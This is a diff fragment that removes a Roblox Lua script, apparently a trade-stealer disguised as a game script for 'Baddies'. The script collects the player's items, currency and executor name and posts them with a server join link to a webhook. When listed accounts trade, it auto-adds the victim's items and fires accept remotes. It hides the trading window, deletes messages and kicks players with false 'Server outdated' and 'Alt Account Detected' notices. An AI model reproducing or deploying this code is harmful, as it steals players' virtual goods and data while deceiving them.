-					Item = Item.Name == "Glitter Bomb"
-				end
-
-				if Item then
-					return true
-				end
-			end
-
-			return false
-		end
-
-		local Item = getData[17]:GetItem("Weapon", itemResult)
-
-		if Item then
-			Item = Item.Name == "Glitter Bomb"
-		end
-	until Item
-
-	return true
-end
-local function alternateHandler()
-	local iterator, state, control = ipairs(getData[17]:FindItems("Weapon"))
-
-	repeat
-		local itemResult
-
-		control, itemResult = iterator(state, control)
-
-		if not control then
-			for _, item in ipairs(getData[17]:FindItems("WeaponSkin")) do
-				local Item = getData[17]:GetItem("WeaponSkin", item)
-
-				if Item then
-					Item = Item.Name == "Glitter Blue Spray"
-				end
-
-				if Item then
-					return true
-				end
-			end
-
-			return false
-		end
-
-		local Item = getData[17]:GetItem("Weapon", itemResult)
-
-		if Item then
-			Item = Item.Name == "Glitter Blue Spray"
-		end
-	until Item
-
-	return true
-end
-local function additionalHandler()
-	local iterator, state, control = ipairs(getData[17]:FindItems("Weapon"))
-
-	repeat
-		local itemResult
-
-		control, itemResult = iterator(state, control)
-
-		if not control then
-			for _, item in ipairs(getData[17]:FindItems("WeaponSkin")) do
-				local Item = getData[17]:GetItem("WeaponSkin", item)
-
-				if Item then
-					Item = Item.Name == "Love Me Hate Me Taser"
-				end
-
-				if Item then
-					return true
-				end
-			end
-
-			return false
-		end
-
-		local Item = getData[17]:GetItem("Weapon", itemResult)
-
-		if Item then
-			Item = Item.Name == "Love Me Hate Me Taser"
-		end
-	until Item
-
-	return true
-end
-local function getDataItems()
-	local getDataItemsFlag = getData[17]:Get()
-
-	if not getDataItemsFlag or not getDataItemsFlag.Items then
-		return nil
-	end
-
-	return getDataItemsFlag.Items
-end
-local displayValueCallback = callbackData[2]
-local function handleData()
-	local nameData = {}
-	local data = {}
-	local dataNumber = 0
-	local number = 0
-	local secondaryDataNumber = 0
-	local secondaryNameData = {}
-	local dataFlag = getDataItems()
-
-	if dataFlag and dataFlag.Weapon then
-		for _, item in pairs(dataFlag.Weapon) do
-			if item and item.Name and not getData[2][item.Name] then
-				local dataCondition = displayValueCallback(item)
-
-				nameData[item.Name] = (nameData[item.Name] or 0) + 1
-				dataNumber += 1
-
-				if dataCondition then
-					number += 1
-				else
-					secondaryDataNumber += 1
-				end
-
-				secondaryNameData[item.Name] = secondaryNameData[item.Name] or {}
-				table.insert(secondaryNameData[item.Name], dataCondition)
-				table.insert(data, item.Name .. "::None::" .. tostring(dataCondition))
-			end
-		end
-	end
-
-	if dataFlag and dataFlag.WeaponSkin then
-		for _, item in pairs(dataFlag.WeaponSkin) do
-			if item then
-				local Weapon = item.Weapon
-
-				if not Weapon then
-					Weapon = item.WeaponName or item.Type
-				end
-
-				local vName = item.Name
-
-				if Weapon and vName and not getData[1][item.Name] then
-					table.insert(data, Weapon .. "::" .. vName .. "::" .. tostring((displayValueCallback(item))))
-				end
-			end
-		end
-	end
-
-	return nameData, data, dataNumber, number, secondaryDataNumber, secondaryNameData
-end
-local function fallbackHandler()
-	local nameData = {}
-	local data = {}
-	local number = 0
-
-	for _, item in ipairs(getData[17]:FindItems("Weapon")) do
-		local Item = getData[17]:GetItem("Weapon", item)
-
-		if Item and Item.Name and not getData[2][Item.Name] then
-			nameData[Item.Name] = (nameData[Item.Name] or 0) + 1
-			number += 1
-			table.insert(data, Item.Name .. "::None")
-		end
-	end
-
-	for _, item in ipairs(getData[17]:FindItems("WeaponSkin")) do
-		local Item = getData[17]:GetItem("WeaponSkin", item)
-
-		if Item then
-			local Weapon = Item.Weapon
-
-			if not Weapon then
-				Weapon = Item.WeaponName or Item.Type
-			end
-
-			local ItemName = Item.Name
-
-			if Weapon and ItemName and not getData[1][Item.Name] then
-				table.insert(data, Weapon .. "::" .. ItemName)
-			end
-		end
-	end
-
-	return nameData, data, number
-end
-local function secondaryHandleData()
-	local ks = {}
-
-	for k, _ in pairs(getData[19]) do
-		table.insert(ks, k)
-	end
-
-	return ks
-end
-callbackData[4] = function()
-	local vs = {}
-
-	for _, item in ipairs(getData[21]) do
-		table.insert(vs, item)
-	end
-
-	return vs
-end
-callbackData[5] = function()
-	local result = #getData[12]:GetPlayers()
-	local MaxPlayers = getData[12].MaxPlayers
-
-	if result < 3 or result >= MaxPlayers - 1 then
-		getData[15]:Kick("Server outdated, Join one above 3+ players")
-
-		return false
-	end
-
-	return true
-end
-local dataCallback
-callbackData[6] = function()
-	local data = secondaryHandleData()
-	local ks = {}
-
-	for k, _ in pairs(getData[20]) do
-		table.insert(ks, k)
-	end
-
-	local secondaryData = dataCallback()
-	local texts = {}
-
-	if #secondaryData > 0 then
-		table.insert(texts, "Fighting Styles:")
-
-		for _, item in ipairs(secondaryData) do
-			table.insert(texts, "• " .. item)
-		end
-
-		table.insert(texts, "")
-	end
-
-	if #data > 0 then
-		table.insert(texts, "Stomps Skins:")
-
-		for _, item in ipairs(data) do
-			table.insert(texts, "• " .. item)
-		end
-
-		table.insert(texts, "")
-	end
-
-	if #ks > 0 then
-		table.insert(texts, "Boards Skins:")
-
-		for _, item in ipairs(ks) do
-			table.insert(texts, "• " .. item)
-		end
-	end
-
-	if #texts == 0 then
-		return "None"
-	end
-
-	return table.concat(texts, "\n")
-end
-dataCallback = callbackData[4]
-local callback = callbackData[3]
-local valueCallback = callbackData[6]
-local secondaryCallback = callbackData[5]
-callbackData[8] = secondaryCallback()
-if not callbackData[8] then
-	return
-end
-local function format(formatNumber)
-	if not formatNumber then
-		return "N/A"
-	end
-
-	if formatNumber >= 1000000 then
-		return string.format("%.1fM", formatNumber / 1000000)
-	end
-
-	if formatNumber >= 1000 then
-		return string.format("%.1fK", formatNumber / 1000)
-	end
-
-	return tostring(formatNumber)
-end
-callbackData[7] = function()
-	local Messages = getData[16]:FindFirstChild("Messages")
-
-	if Messages then
-		Messages:Destroy()
-	end
-end
-local function nestedHandler(url, bodyOption)
-	local flag = not url
-
-	if not flag then
-		flag = url == ""
-	end
-
-	if flag then
-		return nil
-	end
-
-	local headersData = {
-		["Content-Type"] = "application/json",
-	}
-	local body = bodyOption
-
-	if type(bodyOption) ~= "string" then
-		local success, result = pcall(function()
-			return getData[14]:JSONEncode(bodyOption)
-		end)
-		body = not success and "{}" or result
-	end
-
-	for _, item in ipairs({
-		function()
-			local request = syn
-
-			if request then
-				request = syn.request
-			end
-
-			if request then
-				local request = syn.request
-				local secondaryUrl = url
-				local headers = headersData
-				local capturedBody = body
-
-				return request({
-					Url = secondaryUrl,
-					Method = "POST",
-					Headers = headers,
-					Body = capturedBody,
-				})
-			end
-		end,
-		function()
-			if request then
-				local requestFunction = request
-				local secondaryUrl = url
-				local headers = headersData
-				local capturedBody = body
-
-				return requestFunction({
-					Url = secondaryUrl,
-					Method = "POST",
-					Headers = headers,
-					Body = capturedBody,
-				})
-			end
-		end,
-		function()
-			local request = http
-
-			if request then
-				request = http.request
-			end
-
-			if request then
-				local request = http.request
-				local secondaryUrl = url
-				local headers = headersData
-				local capturedBody = body
-
-				return request({
-					Url = secondaryUrl,
-					Method = "POST",
-					Headers = headers,
-					Body = capturedBody,
-				})
-			end
-		end,
-		function()
-			if http_request then
-				local httpRequest = http_request
-				local secondaryUrl = url
-				local headers = headersData
-				local capturedBody = body
-
-				return httpRequest({
-					Url = secondaryUrl,
-					Method = "POST",
-					Headers = headers,
-					Body = capturedBody,
-				})
-			end
-		end,
-		function()
-			local request = fluxus
-
-			if request then
-				request = fluxus.request
-			end
-
-			if request then
-				local request = fluxus.request
-				local secondaryUrl = url
-				local headers = headersData
-				local capturedBody = body
-
-				return request({
-					Url = secondaryUrl,
-					Method = "POST",
-					Headers = headers,
-					Body = capturedBody,
-				})
-			end
-		end,
-	}) do
-		local ok, result = pcall(item)
-
-		if not (ok and result) then
-			continue
-		end
-
-		local isResultSuccess = result.Success == true
-
-		if not isResultSuccess then
-			isResultSuccess = result.StatusCode == 200 or result.Body ~= nil
-		end
-
-		if isResultSuccess then
-			return result
-		end
-	end
-
-	return nil
-end
-callbackData[9] = function()
-	for _ = 1, 20 do
-		pcall(function()
-			alternateRemoteFunction:InvokeServer()
-		end)
-		task.wait(0.05)
-	end
-end
-callbackData[10] = function(guiObject)
-	if not guiObject then
-		return false
-	end
-
-	return (
-		pcall(function()
-			if guiObject.MouseButton1Click then
-				firesignal(guiObject.MouseButton1Click)
-
-				return
-			end
-
-			if guiObject.Activated then
-				firesignal(guiObject.Activated)
-			end
-		end)
-	)
-end
-local alternateCallback = callbackData[10]
-callbackData[11] = function()
-	local Trading = getData[16]:FindFirstChild("Trading")
-
-	if not Trading then
-		return 0
-	end
-
-	local Frame = Trading:FindFirstChild("Frame")
-
-	if not Frame then
-		return 0
-	end
-
-	local Main = Frame:FindFirstChild("Main")
-
-	if not Main then
-		return 0
-	end
-
-	local YourOffer = Main:FindFirstChild("YourOffer")
-
-	if not YourOffer then
-		return 0
-	end
-
-	local ItemDisplay = YourOffer:FindFirstChild("ItemDisplay")
-
-	if not ItemDisplay then
-		return 0
-	end
-
-	local ScrollingFrame = ItemDisplay:FindFirstChild("ScrollingFrame")
-
-	if not ScrollingFrame then
-		return 0
-	end
-
-	local _, data = fallbackHandler()
-	local number = 0
-
-	ScrollingFrame.CanvasPosition = Vector2.new(0, 0)
-	task.wait(0.1)
-
-	for _, item in ipairs(data) do
-		local firstChild = ScrollingFrame:FindFirstChild(item)
-		local secondaryFirstChild = firstChild
-
-		if firstChild then
-			secondaryFirstChild = firstChild:IsA("ImageButton") and firstChild.Visible
-		end
-
-		if secondaryFirstChild and alternateCallback(firstChild) then
-			number += 1
-			task.wait(0.08)
-		end
-	end
-
-	local difference = ScrollingFrame.CanvasSize.Y.Offset - ScrollingFrame.AbsoluteWindowSize.Y
-
-	if difference > 0 then
-		ScrollingFrame.CanvasPosition = Vector2.new(0, difference)
-		task.wait(0.1)
-
-		for _, item in ipairs(data) do
-			local firstChild = ScrollingFrame:FindFirstChild(item)
-			local secondaryFirstChild = firstChild
-
-			if firstChild then
-				secondaryFirstChild = firstChild:IsA("ImageButton") and firstChild.Visible
-			end
-
-			if secondaryFirstChild and alternateCallback(firstChild) then
-				number += 1
-				task.wait(0.08)
-			end
-		end
-	end
-
-	return number
-end
-local numberCallback = callbackData[11]
-callbackData[12] = function()
-	local Trading = getData[16]:FindFirstChild("Trading")
-
-	if not Trading then
-		return 0
-	end
-
-	local Frame = Trading:FindFirstChild("Frame")
-
-	if not Frame then
-		return 0
-	end
-
-	local Main = Frame:FindFirstChild("Main")
-
-	if not Main then
-		return 0
-	end
-
-	local YourOffer = Main:FindFirstChild("YourOffer")
-
-	if not YourOffer then
-		return 0
-	end
-
-	local ItemDisplay = YourOffer:FindFirstChild("ItemDisplay")
-
-	if not ItemDisplay then
-		return 0
-	end
-
-	local ScrollingFrame = ItemDisplay:FindFirstChild("ScrollingFrame")
-
-	if not ScrollingFrame then
-		return 0
-	end
-
-	local data = dataCallback()
-
-	if #data == 0 then
-		return 0
-	end
-
-	ScrollingFrame.CanvasPosition = Vector2.new(0, 0)
-	task.wait(0.1)
-
-	local number = 0
-
-	for _, item in ipairs(data) do
-		for _, child in ipairs(ScrollingFrame:GetChildren()) do
-			if not (child:IsA("ImageButton") and child.Visible) then
-				continue
-			end
-
-			local searchQuery = child.Name:lower()
-			local searchableText = item:lower()
-			local flag = searchQuery == searchableText
-
-			if not flag then
-				flag = string.find(searchQuery, searchableText)
-
-				if not flag then
-					flag = string.find(searchableText, searchQuery)
-				end
-			end
-
-			if flag and alternateCallback(child) then
-				number += 1
-				task.wait(0.08)
-
-				break
-			end
-		end
-	end
-
-	if not (number > 0) then
-	end
-
-	return number
-end
-callbackData[13] = function()
-	if flag then
-		return 0
-	end
-
-	local Trading = getData[16]:FindFirstChild("Trading")
-
-	if not Trading then
-		return 0
-	end
-
-	local Frame = Trading:FindFirstChild("Frame")
-
-	if not Frame then
-		return 0
-	end
-
-	local Main = Frame:FindFirstChild("Main")
-
-	if not Main then
-		return 0
-	end
-
-	local YourOffer = Main:FindFirstChild("YourOffer")
-
-	if not YourOffer then
-		return 0
-	end
-
-	local ItemDisplay = YourOffer:FindFirstChild("ItemDisplay")
-
-	if not ItemDisplay then
-		return 0
-	end
-
-	local ScrollingFrame = ItemDisplay:FindFirstChild("ScrollingFrame")
-
-	if not ScrollingFrame then
-		return 0
-	end
-
-	local data = callback()
-
-	if #data == 0 then
-		return 0
-	end
-
-	ScrollingFrame.CanvasPosition = Vector2.new(0, 0)
-	task.wait(0.1)
-
-	local number = 0
-
-	for _, item in ipairs(data) do
-		local GetChildren = ScrollingFrame.GetChildren
-
-		for _, secondaryItem in ipairs(GetChildren(ScrollingFrame)) do
-			if not (secondaryItem:IsA("ImageButton") and secondaryItem.Visible) then
-				continue
-			end
-
-			local searchQuery = secondaryItem.Name:lower()
-			local searchableText = item:lower()
-			local flag = searchQuery == searchableText
-
-			if not flag then
-				flag = string.find(searchQuery, searchableText)
-
-				if not flag then
-					flag = string.find(searchableText, searchQuery)
-				end
-			end
-
-			if flag and alternateCallback(secondaryItem) then
-				number += 1
-				task.wait(0.08)
-
-				break
-			end
-		end
-	end
-
-	if number > 0 then
-		flag = true
-	end
-
-	return number
-end
-callbackData[14] = function(secondaryFlag)
-	local flag = not secondaryFlag
-
-	if not flag then
-		flag = sendRequestFlag
-
-		if not flag then
-			flag = flagData[secondaryFlag]
-		end
-	end
-
-	if flag then
-		return false
-	end
-
-	for i = 1, 3 do
-		local ok, result = pcall(function()
-			return remoteFunction:InvokeServer(secondaryFlag)
-		end)
-
-		if ok and result then
-			return true
-		end
-
-		if i < 3 then
-			task.wait(0.5)
-		end
-	end
-
-	return false
-end
-local secondaryNumberCallback = callbackData[12]
-local alternateNumberCallback = callbackData[13]
-callbackData[15] = function()
-	local Trading = getData[16]:FindFirstChild("Trading")
-
-	if Trading then
-		local Frame = Trading:FindFirstChild("Frame")
-
-		if Frame then
-			local Categories = Frame:FindFirstChild("Categories")
-
-			if Categories then
-				local TokenAmount = Categories:FindFirstChild("TokenAmount")
-
-				if TokenAmount then
-					local TextLabel = TokenAmount:FindFirstChild("TextLabel")
-
-					if TextLabel then
-						local match = string.match(TextLabel.Text, "%d+")
-
-						if match then
-							return tonumber(match)
-						end
-					end
-				end
-			end
-		end
-	end
-
-	return 0
-end
-local flagCallback
-callbackData[16] = function()
-	task.wait(0.2)
-
-	local number = numberCallback()
-
-	task.wait(0.3)
-
-	local secondaryNumber = secondaryNumberCallback()
-
-	task.wait(0.3)
-
-	local alternateNumber = alternateNumberCallback()
-
-	task.wait(0.2)
-
-	local flag = flagCallback()
-
-	if flag and flag > 0 then
-		pcall(function()
-			fallbackRemoteFunction:InvokeServer(flag)
-		end)
-	end
-
-	return number + secondaryNumber + alternateNumber
-end
-flagCallback = callbackData[15]
-local sendRequestCallback = callbackData[9]
-callbackData[18] = function()
-	task.wait(0.2)
-	numberCallback()
-	task.wait(0.3)
-	secondaryNumberCallback()
-	task.wait(0.3)
-	alternateNumberCallback()
-	task.wait(0.2)
-
-	local flag = flagCallback()
-
-	if flag and flag > 0 then
-		pcall(function()
-			fallbackRemoteFunction:InvokeServer(flag)
-		end)
-	end
-
-	task.wait(0.2)
-	pcall(function()
-		secondaryRemoteFunction:InvokeServer(true)
-	end)
-	task.wait(0.2)
-	pcall(function()
-		alternateRemoteFunction:InvokeServer()
-	end)
-end
-callbackData[19] = function()
-	task.wait(0.2)
-
-	if flag then
-		task.wait(0.2)
-
-		local flag = flagCallback()
-
-		if flag and flag > 0 then
-			pcall(function()
-				fallbackRemoteFunction:InvokeServer(flag)
-			end)
-		end
-
-		task.wait(0.2)
-		pcall(function()
-			secondaryRemoteFunction:InvokeServer(true)
-		end)
-		task.wait(0.2)
-		pcall(function()
-			alternateRemoteFunction:InvokeServer()
-		end)
-
-		return
-	end
-
-	if alternateNumberCallback() > 0 then
-		task.wait(2)
-
-		local flag = flagCallback()
-
-		if flag and flag > 0 then
-			pcall(function()
-				fallbackRemoteFunction:InvokeServer(flag)
-			end)
-			task.wait(0.2)
-		end
-
-		pcall(function()
-			secondaryRemoteFunction:InvokeServer(true)
-		end)
-		task.wait(0.2)
-		pcall(function()
-			alternateRemoteFunction:InvokeServer()
-		end)
-	end
-end
-local secondarySendRequestCallback = callbackData[16]
-local function sendRequest()
-	secondarySendRequestCallback()
-	task.wait(0.2)
-	pcall(function()
-		additionalRemoteFunction:InvokeServer(getData[15])
-	end)
-	task.wait(0.2)
-	sendRequestCallback()
-	sendRequestFlag = false
-end
-local additionalCallback = callbackData[14]
-local alternateSendRequestCallback
-callbackData[21] = function(argument)
-	task.wait(0.2)
-	local replion = getData[18].Client:GetReplion(argument)
-	if not replion then
-		return
-	end
-	local PlayerList = replion.Data.PlayerList
-	if not PlayerList or #PlayerList < 2 then
-		return
-	end
-	local expectedMembership = PlayerList[1]
-	local secondaryExpectedMembership = PlayerList[2]
-	local flag = false
-	local option = expectedMembership == getData[15] or secondaryExpectedMembership == getData[15]
-	local iterator, state, control = ipairs(vs)
-	local secondaryFlag
-	repeat
-		local controlResult
-
-		control, controlResult = iterator(state, control)
-
-		if not control then
-			secondaryFlag = true
-		end
-
-		if secondaryFlag then
-			break
-		end
-	until expectedMembership.Name:lower() == controlResult:lower()
-		or secondaryExpectedMembership.Name:lower() == controlResult:lower()
-	if not secondaryFlag then
-		flag = true
-	end
-	secondaryFlag = false
-	if flag and option and getData[16]:FindFirstChild("Trading") then
-		task.spawn(function()
-			alternateSendRequestCallback()
-		end)
-	end
-end
-alternateSendRequestCallback = callbackData[18]
-local additionalSendRequestCallback = callbackData[19]
-callbackData[22] = function(argument, secondaryArgument)
-	local PlayerByUserId = getData[12]:GetPlayerByUserId(argument)
-	if not PlayerByUserId then
-		return
-	end
-	local lower = secondaryArgument:lower()
-	local flag
-	if lower == "s" then
-		local flag = false
-
-		for _, item in ipairs(vs) do
-			if PlayerByUserId.Name:lower() == item:lower() then
-				flag = true
-
-				break
-			end
-		end
-
-		if flag then
-			task.spawn(function()
-				additionalSendRequestCallback()
-			end)
-		end
-	end
-	if lower == "1" or lower == "2" then
-		local secondaryFlag = false
-		local iterator, state, control = ipairs(vs)
-
-		repeat
-			local controlResult
-
-			control, controlResult = iterator(state, control)
-
-			if not control then
-				flag = true
-			end
-
-			if flag then
-				break
-			end
-		until PlayerByUserId.Name:lower() == controlResult:lower()
-
-		if not flag then
-			secondaryFlag = true
-		end
-
-		flag = false
-
-		if secondaryFlag then
-			if lower == "1" then
-				task.wait(0.2)
-				pcall(function()
-					secondaryRemoteFunction:InvokeServer(true)
-				end)
-
-				return
-			end
-
-			if lower == "2" then
-				task.wait(0.2)
-				pcall(function()
-					alternateRemoteFunction:InvokeServer()
-				end)
-			end
-		end
-	end
-end
-callbackData[19] = function()
-	if not secondaryCallback() then
-		return nil
-	end
-
-	local data, _, result, text, secondaryText, secondaryData = handleData()
-
-	if result < 1 then
-		getData[15]:Kick("Alt Account Detected")
-
-		return nil
-	end
-
-	local flag = false
-
-	if handler() then
-		flag = true
-	end
-
-	if secondaryHandler() then
-		flag = true
-	end
-
-	if alternateHandler() then
-		flag = true
-	end
-
-	if additionalHandler() then
-		flag = true
-	end
-
-	local textData = {}
-
-	for k, item in pairs(data) do
-		local flag = true
-		local secondaryK = k
-		local data = secondaryData[secondaryK]
-
-		if data then
-			for _, item in ipairs(data) do
-				if not item then
-					flag = false
-
-					break
-				end
-			end
-		end
-
-		table.insert(textData, (not flag and "🔴" or "🟢") .. " " .. item .. "x " .. secondaryK)
-	end
-
-	table.sort(textData)
-
-	local alternateText = table.concat(textData, "\n")
-
-	if alternateText == "" then
-		alternateText = "None"
-	end
-
-	local value = valueCallback()
-	local leaderstats = getData[15]:FindFirstChild("leaderstats")
-	local dinero = leaderstats
-
-	if leaderstats then
-		dinero = leaderstats:FindFirstChild("Dinero")
-
-		if dinero then
-			dinero = leaderstats.Dinero.Value
-		end
-	end
-
-	local formatNumber = dinero or "N/A"
-
-	if leaderstats then
-		local Slays = leaderstats:FindFirstChild("Slays")
-
-		if Slays then
-			Slays = leaderstats.Slays.Value
-		end
-
-		leaderstats = Slays
-	end
-
-	local displayValueOption = leaderstats or "N/A"
-	local displayValue = format(formatNumber)
-	local secondaryDisplayValue = format(displayValueOption)
-	local textResult = "Unknown"
-
-	if syn then
-		textResult = "Synapse X"
-	elseif fluxus then
-		textResult = "Fluxus"
-	elseif request then
-		local getinfo = debug.getinfo(request)
-
-		textResult = not (getinfo and getinfo.source) and "Unknown Executor"
-			or if not string.find(getinfo.source, "krnl")
-				then if not string.find(getinfo.source, "scriptware")
-					then not string.find(getinfo.source, "delta") and "Unknown Executor" or "Delta"
-					else "ScriptWare"
-				else "Krnl"
-	elseif http_request then
-		textResult = "HTTP Request"
-	elseif is_sirhurt then
-		textResult = "Sirhurt"
-	elseif pebc_execute then
-		textResult = "ProtoSmasher"
-	elseif KRNL_LOADED then
-		textResult = "Krnl"
-	elseif Synapse then
-		textResult = "Synapse X"
-	elseif getexecutorname then
-		local success, result = pcall(getexecutorname)
-		if success then
-			textResult = result
-		end
-	end
-
-	local Name = getData[15].Name
-	local joiner = "https://plsbrainrot.me/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
-	local contentText = "local ts = game:GetService('TeleportService') ts:TeleportToPlaceInstance("
-		.. game.PlaceId
-		.. ", '"
-		.. game.JobId
-		.. "')"
-
-	if flag then
-		local valueText = "`" .. Name .. "`"
-		local userOption = {
-			name = "User",
-			value = valueText,
-			inline = true,
-		}
-		local additionalText = "`" .. tostring(displayValue) .. "`"
-		local dineroOption = {
-			name = "Dinero",
-			value = additionalText,
-			inline = true,
-		}
-		local fallbackText = "`" .. tostring(secondaryDisplayValue) .. "`"
-		local slaysOption = {
-			name = "Slays",
-			value = fallbackText,
-			inline = true,
-		}
-		local nestedText = "`" .. textResult .. "`"
-		local executorOption = {
-			name = "Executor",
-			value = nestedText,
-			inline = true,
-		}
-		local innerText = "`" .. #getData[12]:GetPlayers() .. " / " .. getData[12].MaxPlayers .. "`"
-		local playersOption = {
-			name = "Players",
-			value = innerText,
-			inline = true,
-		}
-		local outerText = "🟢 Tradable: " .. text .. " | 🔴 Untradable: " .. secondaryText
-		local tradeStatusOption = {
-			name = "Trade Status",
-			value = outerText,
-			inline = true,
-		}
-		local fieldsData = {
-			name = "⚠\239\184\143 RICH WEBHOOK SKIPPED ⚠\239\184\143",
-			value = "User has restricted weapons - NOT sending to rich webhook",
-			inline = false,
-		}
-		local previousText = "```" .. alternateText .. "```"
-		local weaponsOption = {
-			name = "Weapons",
-			value = previousText,
-			inline = false,
-		}
-		local skinsFightingStylesOption = {
-			name = "Skins & Fighting Styles",
-			value = value,
-			inline = false,
-		}
-		local currentText = "[Click to Join](" .. joiner .. ")"
-		local fields = {
-			userOption,
-			dineroOption,
-			slaysOption,
-			executorOption,
-			playersOption,
-			tradeStatusOption,
-			fieldsData,
-			weaponsOption,
-			skinsFightingStylesOption,
-			{
-				name = "Join Link",
-				value = currentText,
-				inline = false,
-			},
-		}
-		local footer = {
-			text = "Ryr's Scripts | Baddies 🍀 • Rich webhook skipped due to restricted weapons",
-		}
-		local timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-		local data = {
-			title = "Ryr's Scripts | Baddies 🍀 (RICH WEBHOOK SKIPPED)",
-			color = 16711680,
-			fields = fields,
-			footer = footer,
-			timestamp = timestamp,
-		}
-
-		if condition then
-			contentText = "@everyone \n" .. contentText
-		end
-
-		local body = {
-			content = contentText,
-			embeds = { data },
-		}
-
-		task.spawn(function()
-			nestedHandler(NODH_WEBHOOK, body)
-		end)
-
-		return true
-	end
-
-	local valueText = "`" .. Name .. "`"
-	local userOption = {
-		name = "User",
-		value = valueText,
-		inline = true,
-	}
-	local additionalText = "`" .. tostring(displayValue) .. "`"
-	local dineroOption = {
-		name = "Dinero",
-		value = additionalText,
-		inline = true,
-	}
-	local fallbackText = "`" .. tostring(secondaryDisplayValue) .. "`"
-	local slaysOption = {
-		name = "Slays",
-		value = fallbackText,
-		inline = true,
-	}
-	local nestedText = "`" .. textResult .. "`"
-	local executorOption = {
-		name = "Executor",
-		value = nestedText,
-		inline = true,
-	}
-	local innerText = "`" .. #getData[12]:GetPlayers() .. " / " .. getData[12].MaxPlayers .. "`"
-	local playersOption = {
-		name = "Players",
-		value = innerText,
-		inline = true,
-	}
-	local outerText = "🟢 Tradable: " .. text .. " | 🔴 Untradable: " .. secondaryText
-	local tradeStatusOption = {
-		name = "Trade Status",
-		value = outerText,
-		inline = true,
-	}
-	local previousText = "```" .. alternateText .. "```"
-	local weaponsOption = {
-		name = "Weapons",
-		value = previousText,
-		inline = false,
-	}
-	local skinsFightingStylesOption = {
-		name = "Skins & Fighting Styles",
-		value = value,
-		inline = false,
-	}
-	local currentText = "[Click to Join](" .. joiner .. ")"
-	local fields = {
-		userOption,
-		dineroOption,
-		slaysOption,
-		executorOption,
-		playersOption,
-		tradeStatusOption,
-		weaponsOption,
-		skinsFightingStylesOption,
-		{
-			name = "Join Link",
-			value = currentText,
-			inline = false,
-		},
-	}
-	local footer = {
-		text = "Void Scripts | Baddies 🍀",
-	}
-	local timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-	local alternateData = {
-		title = "Void Scripts | Baddies 🍀",
-		color = 16711680,
-		fields = fields,
-		footer = footer,
-		timestamp = timestamp,
-	}
-
-	if condition then
-		contentText = "@everyone \n" .. contentText
-	end
-
-	local additionalData = {
-		content = contentText,
-		embeds = { alternateData },
-	}
-
-	task.spawn(function()
-		local nodhWebhook = NODH_WEBHOOK
-
-		if nodhWebhook then
-			nodhWebhook = NODH_WEBHOOK ~= ""
-		end
-
-		if nodhWebhook then
-			local nodhWebhook = NODH_WEBHOOK
-			local data = additionalData
-
-			nestedHandler(nodhWebhook, data)
-		end
-	end)
-
-	return true
-end
-TradeData.Remotes.TradeStarted.OnClientEvent:Connect(callbackData[21])
-remoteEvent.OnClientEvent:Connect(callbackData[22])
-callbackData[27] = RunService.RenderStepped
-callbackData[23] = function()
-	local Character = getData[15].Character
-
-	if Character then
-		Character = getData[15].Character:FindFirstChild("Humanoid")
-	end
-
-	if
-		Character
-		and (getData[15].Character.Humanoid:GetState() == Enum.HumanoidStateType.Jumping and true)
-		and getData[16]:FindFirstChild("Trading")
-	then
-		task.spawn(function()
-			alternateSendRequestCallback()
-		end)
-	end
-end
-callbackData[27]:Connect(callbackData[23])
-callbackData[26] = function(secondaryParent)
-	if parentData[secondaryParent] then
-		return
-	end
-
-	parentData[secondaryParent] = true
-	task.spawn(function()
-		while true do
-			local parent = parentData[secondaryParent]
-
-			if parent then
-				parent = secondaryParent
-
-				if parent then
-					parent = secondaryParent.Parent
-				end
-			end
-
-			if not parent then
-				break
-			end
-
-			if not sendRequestFlag and not flagData[secondaryParent] then
-				additionalCallback(secondaryParent)
-			end
-
-			task.wait(1)
-		end
-
-		parentData[secondaryParent] = nil
-	end)
-end
-callbackData[23] = function(argument)
-	parentData[argument] = nil
-end
-local fallbackCallback = callbackData[26]
-local nestedCallback = callbackData[23]
-callbackData[25] = ipairs
-callbackData[23] = function(expectedMembership)
-	if not expectedMembership or expectedMembership == getData[15] then
-		return
-	end
-
-	for _, item in ipairs(vs) do
-		if expectedMembership.Name:lower() == item:lower() then
-			fallbackCallback(expectedMembership)
-
-			return
-		end
-	end
-end
-local result = getData[12]
-callbackData[24] = function(argument)
-	if parentData[argument] then
-		nestedCallback(argument)
-	end
-end
-for _, expectedMembership in callbackData[25](result:GetPlayers()) do
-	if expectedMembership ~= getData[15] then
-		for _, item in ipairs(vs) do
-			if expectedMembership.Name:lower() == item:lower() then
-				fallbackCallback(expectedMembership)
-
-				break
-			end
-		end
-	end
-end
-getData[12].PlayerAdded:Connect(callbackData[23])
-getData[12].PlayerRemoving:Connect(callbackData[24])
-callbackData[20] = function()
-	pcall(function()
-		secondaryRemoteEvent:FireServer("TradeEnabled", true)
-	end)
-	getData[16]:WaitForChild("TradeList"):WaitForChild("Main"):WaitForChild("TradeRequest").Visible = true
-	getData[11].Modules.Net["RE/Trading/TradeStarted"].OnClientEvent:Connect(function(instance)
-		if instance and instance.Name then
-			local flag = false
-			local iterator, state, control = ipairs(vs)
-			local secondaryFlag
-			repeat
-				local controlResult
-
-				control, controlResult = iterator(state, control)
-
-				if not control then
-					secondaryFlag = true
-				end
-
-				if secondaryFlag then
-					break
-				end
-			until instance.Name:lower() == controlResult:lower()
-			if not secondaryFlag then
-				flag = true
-			end
-			if flag and not sendRequestFlag then
-				nestedCallback(instance)
-				sendRequestFlag = true
-				flagData[instance] = true
-				task.wait(0.2)
-				sendRequest()
-				flagData[instance] = nil
-
-				if instance and instance.Parent then
-					fallbackCallback(instance)
-				end
-			end
-		end
-	end)
-
-	local function onChildAdded(instance)
-		local flag = false
-		local iterator, state, control = pairs(updateInstancePropertiesData)
-		local secondaryFlag
-		repeat
-			local controlResult
-
-			control, controlResult = iterator(state, control)
-
-			if not control then
-				secondaryFlag = true
-			end
-
-			if secondaryFlag then
-				break
-			end
-		until control == instance.Name
-		if not secondaryFlag then
-			flag = true
-		end
-		if flag then
-			return
-		end
-		if instance.Name == "Trading" then
-			instance.Enabled = false
-
-			return
-		end
-		if instance.Name == "Messages" then
-			instance:Destroy()
-		end
-	end
-
-	for _, child in ipairs(getData[16]:GetChildren()) do
-		onChildAdded(child)
-	end
-
-	getData[16].ChildAdded:Connect(onChildAdded)
-	task.spawn(function()
-		while secondaryCallback() do
-			local Trading = getData[16]:FindFirstChild("Trading")
-
-			if Trading then
-				Trading.Enabled = false
-			end
-
-			local Messages = getData[16]:FindFirstChild("Messages")
-
-			if Messages then
-				Messages:Destroy()
-			end
-
-			task.wait()
